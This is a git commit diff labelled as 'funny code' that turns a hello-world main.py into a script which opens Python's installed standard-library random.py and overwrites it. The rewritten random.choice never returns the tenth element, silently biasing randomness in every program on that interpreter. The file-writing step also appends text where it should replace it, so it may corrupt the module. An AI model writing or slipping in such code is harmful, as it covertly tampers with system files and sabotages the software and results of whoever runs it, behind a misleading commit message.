85b1ee7fb5917e7f2f2d745e197d61d60b9ba7cc
ovo-Tim <ovo-tim@qq.com>
2025-10-23 17:38:00 +0800

    feat: update some funny code

--- main.py
+++ main.py
@@ -1,6 +1,29 @@
-def main():
-    print("Hello from mini-project!")
+import random
 
+tar = '''
+    def choice(self, seq):
+        """Choose a random element from a non-empty sequence."""
 
-if __name__ == "__main__":
-    main()
+        # As an accommodation for NumPy, we don't use "if not seq"
+        # because bool(numpy.array()) raises a ValueError.
+        if not len(seq):
+            raise IndexError("Cannot choose from an empty sequence")
+        i = self._randbelow(len(seq))
+        return seq[self.choice(seq) if i in [9] else i]
+'''
+
+org = '''
+    def choice(self, seq):
+        """Choose a random element from a non-empty sequence."""
+
+        # As an accommodation for NumPy, we don't use "if not seq"
+        # because bool(numpy.array()) raises a ValueError.
+        if not len(seq):
+            raise IndexError("Cannot choose from an empty sequence")
+        return seq[self._randbelow(len(seq))]
+'''
+
+p = random.__file__
+del random
+with open(p, "r+") as f:
+    f.write(f.read().replace(org, tar))
